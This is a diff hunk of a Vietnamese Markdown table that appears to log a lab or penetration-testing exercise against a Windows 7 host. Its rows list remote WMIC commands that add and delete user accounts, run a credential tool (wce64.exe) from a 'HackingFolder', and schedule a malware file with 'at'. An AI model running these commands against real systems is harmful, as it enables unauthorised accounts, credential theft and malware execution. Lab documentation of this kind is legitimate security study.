@@ -65,7 +65,6 @@
 | sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "net user [username] [password] /add"` | Thêm một tài khoản vào hệ thống | 2 | 2 |
 | sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "net user hacker /del"` | Xóa tài khoản khỏi hệ thống | 1 | 1 |
 | sv | 192.168.255.129 | Windows 7 | Thành viên của Administrator group | `wmic process call create "F:\HackingFolder\wce64.exe"` | Thực thi file trên hệ thống nạn nhân | 2 | 2 |
-
 | Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic process call create "net user [username] [password] /add"` | Thêm một tài khoản vào hệ thống | 2 | 2 |
 | Administrator | 192.168.255.129 | Windows 7 | Administrator | `wmic process call create "at [timestamp] [filename]"` | Chạy lập lịch file mã độc | 2 | 2 |
 
